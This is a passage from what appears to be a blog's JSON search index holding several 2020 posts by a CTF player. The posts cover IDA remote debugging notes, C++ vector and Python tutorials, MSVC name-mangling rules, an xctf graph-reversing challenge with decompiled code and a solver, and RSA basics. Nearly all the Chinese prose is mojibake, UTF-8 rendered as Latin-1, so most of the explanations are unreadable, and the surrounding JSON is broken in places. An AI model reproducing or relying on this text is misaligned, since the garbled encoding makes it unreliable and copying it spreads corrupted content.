çš„é…åˆä½¿ç”¨æ¥åŠ¨æ€è°ƒè¯•ï¼š # â€‹\tå‰æ®µæ—¶é—´å¼€å§‹å°è¯•ä¸ä¾èµ– ida è·‘ pe æ–‡ä»¶ä»¥è¾¾åˆ°è®­ç»ƒæ±‡ç¼–å’Œè§‚å¯Ÿå†…å­˜å¯„å­˜å™¨çš„èƒ½åŠ›\nå¦‚ g é”®å®šä½åˆ°ç›®æ ‡åœ°å€ï¼Œæ‹–åŠ¨çª—å£ä½ç½®ä»¥ä¾¿è§‚å¯Ÿç­‰æ“ä½œï¼Œä»¥åä¹Ÿè®¸å¼€ä¸€ä¸ª ida å¥‡æ·«æŠ€å·§ç¯‡ï¼Ÿï¼ˆxï¼‰ äº‹å®è¯æ˜è¿˜æ˜¯æ´¾çš„ä¸Šç”¨åœºçš„ï¼Œå°è¯•åœ¨å„ç§å„æ ·çš„è™šæ‹Ÿæœºä¸Šè·‘idaçš„ dbgsrv ï¼Œè¿œç¨‹åŠ¨è°ƒç†Ÿç»ƒäº†æ€»æ˜¯å¥½çš„\nâ€‹\tå¼ºè¡Œçœ‹æ±‡ç¼–å¯¹æ±‡ç¼–çš„ç¼–å†™èƒ½åŠ›åº”è¯¥ä¹Ÿä¼šæœ‰æå‡æŠŠï¼Ÿ\næˆ‘è¯­è¨€èƒ½åŠ›ä¸€ç›´å¾ˆå·®ï¼Œå†™è¿™ä¹ˆå¤šå·²ç»æ˜¯æé™äº† ORZ\n","date":"20 March 2020","permalink":"/achieve/2019to2021/mrctf2020/","section":"archive","summary":"è‡ªå·±åšå®¢å°±æ‡’å¾—æ”¾wpè¿™ç§ä¸œè¥¿äº†,å†™ä¸€ç‚¹æ€»ç»“æ€§çš„ä¸œè¥¿ï¼Œè¿‡å‡ å¤©å§å¯†ç å­¦å­¦ä¹ æˆæœpoå‡ºæ¥å¥½äº† ä½ æ˜¯æ‡’å¾—piçˆ†","title":"MRCTF_2020"},{"content":"\rç®€å•å®ä¾‹: # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; class local{ public: int x; int y; }; int main() { vector\u0026lt;int\u0026gt; a; vector\u0026lt;string\u0026gt; b; vector\u0026lt;local\u0026gt; c;//å‘é‡çš„ç”³æ˜ a.push_back(1); b.push_back(\u0026#34;acdc\u0026#34;); local l1;//ç±»æˆ–è€…ç»“æ„ä½“è¦å…ˆåˆå§‹å†æ”¾è¿›å» l1.x=1; l1.y=2; c.push_back(l1);//ç”¨äºåœ¨é˜Ÿå°¾å‹å…¥æ•°æ®push_backæˆå‘˜å‡½æ•° cout\u0026lt;\u0026lt;\u0026#34;a[0]=\u0026#34;\u0026lt;\u0026lt;a[0]\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;b[0]=\u0026#34;\u0026lt;\u0026lt;b[0]\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;c[0].x=\u0026#34;\u0026lt;\u0026lt;c[0].x\u0026lt;\u0026lt;\u0026#34;c[0].y=\u0026#34;\u0026lt;\u0026lt;c[0].y\u0026lt;\u0026lt;endl; a.push_back(2); cout\u0026lt;\u0026lt;\u0026#34;a_len=\u0026#34;\u0026lt;\u0026lt;a.size()\u0026lt;\u0026lt;endl;//æˆå‘˜å‡½æ•°size() a.pop_back();//pop_back()ç§»é™¤é˜Ÿå°¾å…ƒç´  cout\u0026lt;\u0026lt;\u0026#34;a_len=\u0026#34;\u0026lt;\u0026lt;a.size()\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); return 0; } /* è¾“å‡ºï¼š a[0]=1 b[0]=acdcz c[0].x=1c[0].y=2 a_len=2 a_len=1 è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . */ å…¶ä»–å¸¸ç”¨æˆå‘˜å‡½æ•°: # clrean()//æ¸…ç©ºå‘é‡ empty()//è¯¢é—®æ˜¯å¦è¿˜æœ‰å…ƒç´  è¿­ä»£å™¨ # åˆ©ç”¨å‘é‡è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸‰è§’å½¢ï¼š # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;string\u0026gt; a; vector\u0026lt;string\u0026gt;::iterator pa;//å¸¸è§„è¿­ä»£å™¨ï¼šå¯ä»¥ä¿®æ”¹å€¼ vector\u0026lt;string\u0026gt;::const_iterator pb;//å¸¸é‡è¿­ä»£å™¨ï¼šä¸å¯ä»¥ä¿®æ”¹å€¼ for(int i=0;i\u0026lt;10;i++) { string s; for(int j=0;j\u0026lt;i+1;j++) { s=s+\u0026#39;a\u0026#39;; } a.push_back(s); }//åˆå§‹åŒ–ä¸€ä¸ªä¸‰è§’å½¢è¿›å» for(pa=a.begin();pa!=a.end();pa++) cout\u0026lt;\u0026lt;*pa\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;\\n\u0026#34;; system(\u0026#34;pause\u0026#34;); return 0; } /* è¾“å‡ºï¼š a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa */ å’Œè¿­ä»£å™¨ç›¸å…³çš„å¸¸ç”¨å‡½æ•°ï¼š # insert(è¿­ä»£å™¨ï¼Œå…ƒç´ )//å‘è¿­ä»£å™¨æŒ‡å‘çš„å‰ä¸€ä½æ’å…¥å…ƒç´  eraseï¼ˆè¿­ä»£å™¨ï¼‰//åˆ é™¤è¿­ä»£å™¨æŒ‡å‘å…ƒç´  ","date":"20 March 2020","permalink":"/achieve/2019to2021/cpp_vector/","section":"archive","summary":"ç®€å•å®ä¾‹: # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.","title":"cpp_vector"},{"content":"\rbytesç±»å‹: # Python 3 æ–°å¢äº† bytes ç±»å‹ï¼Œç”¨äºä»£è¡¨å­—èŠ‚ä¸²ï¼ˆè¿™æ˜¯ä½œè€…ç”Ÿé€ çš„ä¸€ä¸ªè¯ï¼Œä¸å­—ç¬¦ä¸²å¯¹åº”ï¼‰ã€‚å­—ç¬¦ä¸²ï¼ˆstrï¼‰ç”±å¤šä¸ªå­—ç¬¦ç»„æˆï¼Œä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œæ“ä½œï¼›å­—èŠ‚ä¸²ï¼ˆbytesï¼‰ç”±å¤šä¸ªå­—èŠ‚ç»„æˆï¼Œä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œæ“ä½œã€‚\nbyteså®ä¾‹åœ¨python3ä¸­å¾—åˆ°äº†å¤§é‡ä½¿ç”¨ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ï¼Œåœ¨å¾ˆå¤šæ—¶å€™éœ€è¦å¯¹å…¶ä»–ç±»å‹çš„æ•°æ®ç”¨bytesè½¬ä¸€ä¸‹æ‰èƒ½ç”¨ã€‚\nç»“æ„ï¼š\nbytes(class bytes(source, encoding, errors) ) æ ¹æ®sourceçš„ä¸åŒï¼Œæœ€ç»ˆå¾—åˆ°çš„è¾“å‡ºç»“æœä¹Ÿä¸åŒ\nå¦‚æœ source ä¸ºæ•´æ•°ï¼Œåˆ™è¿”å›ä¸€ä¸ªé•¿åº¦ä¸º source çš„åˆå§‹åŒ–æ•°ç»„ï¼› å¦‚æœ source ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™æŒ‰ç…§æŒ‡å®šçš„ encoding å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼› å¦‚æœ source ä¸ºå¯è¿­ä»£ç±»å‹ï¼Œåˆ™å…ƒç´ å¿…é¡»ä¸º[0 ,255] ä¸­çš„æ•´æ•°ï¼› å¦‚æœ source ä¸ºä¸ buffer æ¥å£ä¸€è‡´çš„å¯¹è±¡ï¼Œåˆ™æ­¤å¯¹è±¡ä¹Ÿå¯ä»¥è¢«ç”¨äºåˆå§‹- åŒ– bytearrayï¼ˆä»¥ååŠ ï¼‰ æœæ²¡æœ‰è¾“å…¥ä»»ä½•å‚æ•°ï¼Œé»˜è®¤å°±æ˜¯åˆå§‹åŒ–æ•°ç»„ä¸º0ä¸ªå…ƒç´  æ•´æ•°ï¼š\nb = bytes(3) print(b,type(b)) #è¾“å‡ºï¼š #b\u0026#39;\\x00\\x00\\x00\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; å­—ç¬¦ä¸²ï¼š\ns=\u0026#39;1234\u0026#39; s2=\u0026#39;ç‰›æ‰¹\u0026#39; b = bytes(s , encoding=\u0026#34;utf8\u0026#34;) b2 = bytes(s2 , encoding=\u0026#34;utf8\u0026#34;) print(b,type(b)) print(b2,type(b2)) \u0026#39;\u0026#39;\u0026#39; è¾“å‡ºï¼š b\u0026#39;1234\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; b\u0026#39;\\xe7\\x89\\x9b\\xe6\\x89\\xb9\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; \u0026#39;\u0026#39;\u0026#39; å¯è¿­ä»£ç±»å‹ï¼ˆlistä¸ºé¦–ï¼‰ï¼š\nb = bytes([1, 2, 3]) print(b, type(b)) print(str(b)) #c = bytes([1, 2, 888]) # 888ä¸å†(0, 256ä¹‹é—´)ä¼šæŠ¥é”™ \u0026#39;\u0026#39;\u0026#39; è¾“å‡º b\u0026#39;\\x01\\x02\\x03\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; b\u0026#39;\\x01\\x02\\x03\u0026#39; \u0026#39;\u0026#39;\u0026#39; byteaç±»å‹çš„æˆå‘˜å‡½æ•°ï¼š ```python\nb=b\u0026rsquo;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08' print(b.hex()) #0102030405060708 (str)\nmap(): # åŸºæœ¬ç»“æ„ï¼š\nmap( å‡½æ•°ï¼Œå¯è¿­ä»£å¯¹è±¡1,å¯è¿­ä»£å¯¹è±¡2......)\nå‡½æ•°ï¼šchr(),ord()\u0026hellip;..\nå¯è¿­ä»£å¯¹è±¡ï¼šlist,å­—ç¬¦ä¸²ç­‰å¯ä»¥ç”¨foréå†çš„å¯¹è±¡ ##### ä¾‹å­ï¼š\ndef f(x): return x+1 l1=[1,2,3,4] it=map(f,l1) #py2ä¸­ç›´æ¥è¿”å›list py3ä¸­è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ print(it) print(list(it)) #print(next(it)) #next ä¸èƒ½ç”¨äºè§£æ mapè¿”å› è¦ç”¨list è¾“å‡º:\n\u0026lt;map object at 0x000001A87E5AF788\u0026gt; [2, 3, 4, 5] å¤šä¸ªå¯¹è±¡ï¼š\ndef f(x,y,z): return x+y+z l1=[1,2,3,4] l2=[4,3,2,1] l3=[1,2,3,4,] it=map(f,l1,l2,l3) print(it) print(list(it)) Output:\n\u0026lt;map object at 0x000001A544CE55C8\u0026gt; [6, 7, 8, 9] ä¾‹ï¼š\narr=[49,50,51,52] str=\u0026#39;1234\u0026#39; it = map(chr,arr) it2 = map(ord,str) print(it) print(list(it)) print(it2) print(list(it2)) è¾“å‡ºï¼š\n\u0026lt;map object at 0x000001B95E7E8308\u0026gt; [\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;] \u0026lt;map object at 0x000001B95D8D2F88\u0026gt; [49, 50, 51, 52] join(): # s=\u0026#39;123\u0026#39; s1 = \u0026#34;-\u0026#34; s2 = \u0026#34;\u0026#34; seq = (\u0026#34;r\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;n\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;b\u0026#34;) # å­—ç¬¦ä¸²åºåˆ— print (s1.join( seq )) print (s2.join( seq )) a=\u0026#34;000\u0026#34;.join(s) #ç­‰ä»·äº a=\u0026#34;000\u0026#34; # a.join(s) print(a) Outputï¼š\nr-u-n-o-o-b runoob 123 repr:(å¥½å§è¿™ä¸ªä¸æ˜¯å¾ˆå¸¸ç”¨) # æŠŠæ‰€æœ‰è¾“å‡ºå…¨éƒ¨ä½œä¸ºå­—ç¬¦ä¸²è¾“å‡º\n\u0026gt;\u0026gt;\u0026gt;s = \u0026#39;RUNOOB\u0026#39; \u0026gt;\u0026gt;\u0026gt; repr(s) \u0026#34;\u0026#39;RUNOOB\u0026#39;\u0026#34; \u0026gt;\u0026gt;\u0026gt; dict = {\u0026#39;runoob\u0026#39;: \u0026#39;runoob.com\u0026#39;, \u0026#39;google\u0026#39;: \u0026#39;google.com\u0026#39;}; \u0026gt;\u0026gt;\u0026gt; repr(dict) \u0026#34;{\u0026#39;google\u0026#39;: \u0026#39;google.com\u0026#39;, \u0026#39;runoob\u0026#39;: \u0026#39;runoob.com\u0026#39;}\u0026#34; \u0026gt;\u0026gt;\u0026gt; ","date":"20 March 2020","permalink":"/achieve/2019to2021/py_useful/","section":"archive","summary":"bytesç±»å‹: # Python 3 æ–°å¢äº† bytes ç±»å‹ï¼Œç”¨äºä»£è¡¨å­—èŠ‚ä¸²ï¼ˆè¿™æ˜¯ä½œè€…ç”Ÿé€ çš„ä¸€ä¸ªè¯ï¼Œä¸å­—ç¬¦ä¸²å¯¹åº”ï¼‰ã€‚å­—ç¬¦ä¸²ï¼ˆstrï¼‰ç”±å¤šä¸ªå­—ç¬¦ç»„æˆï¼Œä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œæ“ä½œï¼›å­—èŠ‚ä¸²ï¼ˆbytesï¼‰ç”±å¤šä¸ªå­—èŠ‚ç»„æˆï¼Œä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œæ“ä½œã€‚","title":"pythonä¸€äº›å¸¸ç”¨è¯­æ³•ï¼ˆè‡ªè®¤ä¸ºï¼‰"},{"content":"\rCç¼–è¯‘å™¨çš„å‡½æ•°åä¿®é¥°è§„åˆ™ ï¼š # __stdcallåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œå‡½æ•°ååé¢åŠ ä¸Šä¸€ä¸ªâ€œ@â€ç¬¦å·å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚_functionname@numberã€‚ __cdeclè°ƒç”¨çº¦å®šä»…åœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œä¾‹å¦‚_functionnameã€‚ __fstcallåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªâ€œ@â€ç¬¦å·ï¼Œåé¢ä¹Ÿæ˜¯ä¸€ä¸ªâ€œ@â€å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚@functionname@number\nC++ç¼–è¯‘å™¨çš„å‡½æ•°åä¿®é¥°è§„åˆ™ï¼š # ä»¥ä¸€ä¸ªâ€œ?â€å¼€å§‹ï¼Œåè·Ÿå‡½æ•°åï¼Œå†åé¢æ˜¯å‚æ•°è¡¨çš„å¼€å§‹æ ‡è¯†å’ŒæŒ‰ç…§å‚æ•°ç±»å‹ä»£å·æ‹¼å‡ºçš„å‚æ•°è¡¨ã€‚ __stdcall å¼€å§‹æ ‡è¯†æ˜¯ â€œ@@YGâ€ __cdecl æ˜¯ â€œ@@YAâ€ __fastcallæ˜¯ â€œ@@YIâ€\nå‚æ•°è¡¨çš„æ‹¼å†™ä»£å·å¦‚ä¸‹æ‰€ç¤ºï¼š # X--void D--char E--unsigned char F--short H--int I--unsigned int J--long K--unsigned longï¼ˆDWORDï¼‰ M--float N--double _N--bool U--struct å…¶ä»–å‚æ•°è¡¨ç¤º # ç”¨PAè¡¨ç¤ºæŒ‡é’ˆï¼Œç”¨PBè¡¨ç¤ºconstç±»å‹çš„æŒ‡é’ˆã€‚åé¢çš„ä»£å·è¡¨æ˜æŒ‡é’ˆç±»å‹ï¼Œå¦‚æœç›¸åŒç±»å‹çš„æŒ‡é’ˆè¿ç»­å‡ºç°ï¼Œä»¥â€œ0â€ä»£æ›¿ï¼Œä¸€ä¸ªâ€œ0â€ä»£è¡¨ä¸€æ¬¡é‡å¤ã€‚ Uè¡¨ç¤ºç»“æ„ç±»å‹ï¼Œé€šå¸¸åè·Ÿç»“æ„ä½“çš„ç±»å‹åï¼Œç”¨â€œ@@â€è¡¨ç¤ºç»“æ„ç±»å‹åçš„ç»“æŸã€‚å‡½æ•°çš„è¿”å›å€¼ä¸ä½œç‰¹æ®Šå¤„ç†ï¼Œå’Œå‡½æ•°ä¸€æ ·ï¼Œç´§è·Ÿç€å‚æ•°è¡¨çš„å¼€å§‹æ ‡å¿—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‡½æ•°å‚æ•°è¡¨çš„ç¬¬ä¸€é¡¹å®é™…ä¸Šæ˜¯è¡¨ç¤ºå‡½æ•°çš„è¿”å›å€¼ç±»å‹ã€‚\nå‚æ•°è¡¨åä»¥â€œ@Zâ€æ ‡è¯†æ•´ä¸ªåå­—çš„ç»“æŸï¼Œå¦‚æœè¯¥å‡½æ•°æ— å‚æ•°ï¼Œåˆ™ä»¥â€œZâ€æ ‡è¯†ç»“æŸã€‚ä¸‹é¢ä¸¾ä¸¤ä¸ªä¾‹å­ï¼Œå‡å¦‚æœ‰ä»¥ä¸‹å‡½æ•°å£°æ˜ï¼š\nint Function1 (char *var1,unsigned long); å…¶å‡½æ•°ä¿®é¥°åä¸ºâ€œ?Function1@@YGHPADK@Zâ€ï¼Œè€Œå¯¹äºå‡½æ•°å£°æ˜ï¼š ?[name][è°ƒç”¨æ–¹å¼][å‚æ•°1][\tå‚æ•°2]....[@z/z] void Function2(); å…¶å‡½æ•°ä¿®é¥°ååˆ™ä¸ºâ€œ?Function2@@YGXXZâ€ ç±»çš„æˆå‘˜å‡½æ•°ï¼š # ä¸»è¦ç»“æ„ï¼š ?[name][ç±»å][ä¿æŠ¤ç±»å‹][å‚æ•°1][\tå‚æ•°2]....[@z/z] class CTest { private: void Function(int); protected: void CopyInfo(const CTest \u0026amp;src); public: long InsightClass(DWORD dwClass) const; æˆå‘˜å‡½æ•°è°ƒç”¨æ–¹å¼æ˜¯__thiscall,åœ¨å‡½æ•°åå’Œå‚æ•°è¡¨ä¹‹é—´æ’å…¥â€œ@â€å­—ç¬¦å¼•å¯¼çš„ç±»å\nä¸‰ç§ç±»å‹è¡¨ç¤ºï¼š # å…¬æœ‰ public æ ‡è¯†â€œ@@QAEâ€ ä¿æŠ¤ protected æ ‡è¯†æ˜¯â€œ@@IAEâ€ ç§æœ‰ private æ ‡è¯†æ˜¯â€œ@@AAEâ€\nå¯¹äºæˆå‘˜å‡½æ•°Functionï¼Œå…¶å‡½æ•°ä¿®é¥°åä¸ºâ€œ?Function@CTest@@AAEXH@Zâ€\n?Function @CTest @@AAE XH@Zâ€ ç±»å ç§æœ‰ å¦‚æœå‡½æ•°å£°æ˜ä½¿ç”¨äº†constå…³é”®å­—ï¼Œåˆ™ç›¸åº”çš„æ ‡è¯†åº”åˆ†åˆ«ä¸ºâ€œ@@QBEâ€ï¼Œâ€œ@@IBEâ€å’Œâ€œ@@ABEâ€ã€‚\nå‚æ•°ç±»å‹æ˜¯ç±»å®ä¾‹çš„å¼•ç”¨,åˆ™ä½¿ç”¨â€œAAV1â€ CopyInfo( CTest \u0026amp;src) è‹¥å°†å…¶ä½œä¸ºconstç±»å‹çš„å¼•ç”¨ï¼Œåˆ™ä½¿ç”¨â€œABV1â€ CopyInfo(const CTest \u0026amp;src)\nå‡½æ•°CopyInfoåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ˜¯å¯¹ç±»CTestçš„constå¼•ç”¨å‚æ•°ï¼Œå…¶å‡½æ•°ä¿®é¥°åä¸º:\n?CopyInfo @CTest @@IAE X ABV1 @@Z protected ä¸ºconstç±»å‹çš„å¼•ç”¨ InsightClassæ˜¯ä¸€ä¸ªå…±æœ‰çš„constå‡½æ•°ï¼Œå®ƒçš„æˆå‘˜å‡½æ•°æ ‡è¯†æ˜¯â€œ@@QBE\u0026quot;:\n?InsightClass@CTest @@QBE J K @Zâ€ã€‚ public https://www.cnblogs.com/CodeMIRACLE/p/5343660.html\n","date":"14 March 2020","permalink":"/achieve/2019to2021/cppxiushi/","section":"archive","summary":"Cç¼–è¯‘å™¨çš„å‡½æ•°åä¿®é¥°è§„åˆ™ ï¼š # __stdcallåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œå‡½æ•°ååé¢åŠ ä¸Šä¸€ä¸ªâ€œ@â€ç¬¦å·å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚_functionname@numberã€‚ __cdeclè°ƒç”¨çº¦å®šä»…åœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œä¾‹å¦‚_functionnameã€‚ __fstcallåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªâ€œ@â€ç¬¦å·ï¼Œåé¢ä¹Ÿæ˜¯ä¸€ä¸ªâ€œ@â€å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚@functionname@number","title":"ä¿®é¥°å‡½æ•°è§„åˆ™"},{"content":"\rxctf-cycle graph # æ²¡æœ‰å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œå°±æ˜¯ç®—æ³•\nint __usercall sub_401080@(char a1@) { void *Graph; // ecx@1 int v2; // edx@1 int v3; // eax@2 signed int t; // edx@3 char b; // al@3 signed int i; // edi@3 int a; // ecx@3 const char *v8; // eax@17 char v10; // [sp-Ch] [bp-30h]@3 int x; // [sp+0h] [bp-24h]@4 char flag; // [sp+8h] [bp-1Ch]@3 char v13; // [sp+9h] [bp-1Bh]@10 char v14; // [sp+Ah] [bp-1Ah]@11 char v15; // [sp+Bh] [bp-19h]@12 char v16; // [sp+Ch] [bp-18h]@13 char v17; // [sp+1Dh] [bp-7h]@14 ::t = 0; Graph = \u0026unk_403384; ::b = 48; v2 = 0; ::a = (int)\u0026address; do { v3 = root[v2]; ++v2; *((_DWORD *)Graph - 1) = v3; *(_DWORD *)Graph = (char *)\u0026address + 12 * branch1[v2]; *((_DWORD *)Graph + 1) = (char *)\u0026address + 12 * branch2[v2]; Graph = (char *)Graph + 12; } while ( (signed int)Graph \u003c (signed int)\u0026end );//ç”Ÿæˆå›¾ sub_401020(\"You need a flag to get out of this:\\n\", a1); sub_401050(\"%s\", (unsigned int)\u0026flag); t = ::t; b = ::b; i = 5; a = ::a; do { x = *(\u0026flag + i); if ( *(_DWORD *)a + b == x )//å°†æ ¹çš„ä¿¡æ¯ä¸flagæ¯”è¾ƒ { a = *(_DWORD *)(a + 4);//èµ° branch1 ã€æ›´æ–°æ ¹çš„åœ°å€ } else { if ( b - *(_DWORD *)a != x ) { sub_401020(\"This is not flag~\\n\", v10); system(\"pause\"); exit(1); } a = *(_DWORD *)(a + 8);//èµ° branch2 ã€æ›´æ–°æ ¹çš„åœ°å€ } b = *(\u0026flag + i); ++t; ++i; ::b = b; ::a = a; ::t = t; } while ( i \u003c 21 ); if ( flag != 102 || v13 != 108 || v14 != 97 || v15 != 103 || v16 != 123 || v17 != 125 ) { v8 = \"illegal input~\\n\"; } else if ( t \u003e 16 || (_UNKNOWN *)a != \u0026end1 )//åˆ¤æ–­ä½ç½® { v8 = \"This is not flag~\\n\"; } else { v8 = \"Congratulations!!\\n\"; } sub_401020(v8, x); system(\"pause\"); return 0; } è¿™ä¸ªå›¾çš„ç»“æ„è¿˜æ˜¯æœ‰ç‚¹æ„æ€ï¼ŒæŠŠä¸€ä¸ªå¤§æ•°ç»„ä¸‰ä¸ªä¸‰ä¸ªåˆ†å¼€å½¢æˆæ ¹èŠ‚ç‚¹å’Œæœ‰å‘çš„è·¯ï¼š\n0 1 3 ...... root branch1 branch2 ...... æ‹¿åˆ°å›¾çš„ç¬¬ä¸€ä¸ªååº”å°±æ˜¯è¯¥é¢˜ä¸é™æ­¥æ•°çš„è¯ä¸€å®šæœ‰å¤šè§£ï¼Œå®Œäº†è¿˜è¦è¿˜è¦æ£€æŸ¥asciiç çš„èŒƒå›´ï¼Œæœ€åæˆ‘è¿˜æ˜¯å†³å®šç”¨å¯»è·¯ç®—æ³•å¸¸ç”¨çš„é€’å½’\næ’¸ä»£ç ï¼š # #include \u0026ltiostream\u0026gt #include \u0026ltstdlib.h\u0026gt using namespace std; int root[90] = {0x34, 0x2, 0x2c, 0x2a, 0x6, 0x2a, 0x2f, 0x2a, 0x33, 0x3, 0x2, 0x32, 0x32, 0x32, 0x30, 0x3, 0x1, 0x32, 0x2b, 0x2, 0x2e, 0x1, 0x2, 0x2d, 0x32, 0x4, 0x2d, 0x30, 0x31, 0x2f, 0x33, 0x5}; int b1[90] = {0x2, 0x2, 0x1, 0x12, 0x7, 0x2, 0x1a, 0xd, 0x4, 0xa, 0x4, 0x15, 0xe, 0x1, 0x0, 0xe, 0x5, 0x7, 0x1c, 0xc, 0x1c, 0xf, 0xf, 0x2, 0x10, 0x17, 0x1e, 0x17, 0x13, 0x9, 0x16, 0x1f}; int b2[90] = {0x1, 0x8, 0x7, 0x17, 0x9, 0x13, 0x1f, 0x17, 0x9, 0xd, 0xc, 0x1d, 0xa, 0x18, 0x9, 0x18, 0x19, 0x9, 0x1a, 0x3, 0x16, 0x6, 0x11, 0xd, 0x7, 0xf, 0x14, 0x1, 0x10, 0x4, 0xb, 0x1f}; int b[90]; int ans[90]; int dir[90]; int flag[90]; void cheak() { int a = 48; int c; for(int i=0;i\u003c16;i++) { if(dir[i] == 1) { c = a + b[i]; if (c\u003c33 || c\u003e126) return; } if(dir[i] == 2) { c = a - b[i]; if (c\u003c33 || c\u003e126) return; } a = c; flag[i]=c; } cout\u003c\u003c\"flag{\"; for(int i=0;i\u003c16;i++) { printf(\"%c\",flag[i]); } cout\u003c\u003c\"}\"; cout\u003c","date":"10 March 2020","permalink":"/achieve/2019to2021/xctf2020/","section":"archive","summary":"xctf-cycle graph # æ²¡æœ‰å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œå°±æ˜¯ç®—æ³•","title":"xctf2020-é«˜æ ¡æˆ˜å½¹"},{"content":"\råˆæ¢RASåŠ å¯† # åŠ å¯†å‡†å¤‡: # æ‰¾ä¸¤ä¸ªæ¯”è¾ƒå¤§çš„è´¨æ•° p ã€q\nè®¾ n = q * p\nè®¾ f(n) = (p-1) * (q-1)\næ‰¾å…¬é’¥ e æ»¡è¶³ï¼š1\u0026lt;e\u0026lt;f(n) ä¸” eã€f(n) äº’è´¨\næ‰¾ç§é’¥ d æ»¡è¶³ : (d * e)% f(n) = 1\nåŠ å¯†ç®—æ³•: # æ˜æ–‡ M å’Œå¯†æ–‡ C æ»¡è¶³ï¼š Me % n= c , Cd % n=Mï¼ˆæ˜æ–‡å’Œå¯†æ–‡éƒ½è¢«äº‹å…ˆè½¬æ¢ä¸ºæ•°å­—ï¼‰ å·²çŸ¥Mã€eã€næ—¶RASçš„å¦‚ä½•è§£å¯†ï¼ˆé™äºqï¼Œpä¸å¤§çš„ç¦»è°±çš„æƒ…å†µè¿›è¡Œæ”»å‡»ï¼‰: # è¦æ‰¾ qï¼Œpï¼Œæ‰€ä»¥è¦å¯¹ n å› å¼åˆ†è§£\næœ‰äº† f(n) å°±å¯ä»¥ç®— e*d %f(n) =1çš„é€†æ¨¡ï¼Œåˆ©ç”¨è®¡ç®—æœºå¯ä»¥è½»æ¾æ±‚å‡º ( å·²çŸ¥ f(n) åˆçŸ¥ e æ±‚ d åä¹‹åŒç† )\nå¤šå› å­RSAåŠ å¯†ï¼š # æ‰¾å¤šä¸ªè´¨æ•° P0 ï¼Œ P1 â€¦â€¦â€¦â€¦ Pn\nn = P0 * P1 \u0026hellip;.. Pn\nphi = (P0-1) \u0026hellip;\u0026hellip; ï¼ˆPn-1ï¼‰\nå…¶ä½™æ­¥éª¤ä¸å¸¸è§„rsaä¸€è‡´\n","date":"5 March 2020","permalink":"/achieve/2019to2021/%E5%88%9D%E6%8E%A2ras%E5%8A%A0%E5%AF%86/","section":"archive","summary":"åˆæ¢RASåŠ å¯† # åŠ å¯†å‡†å¤‡: # æ‰¾ä¸¤ä¸ªæ¯”è¾ƒå¤§çš„è´¨æ•° p ã€q","title":"åˆæ¢rasåŠ å¯†"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]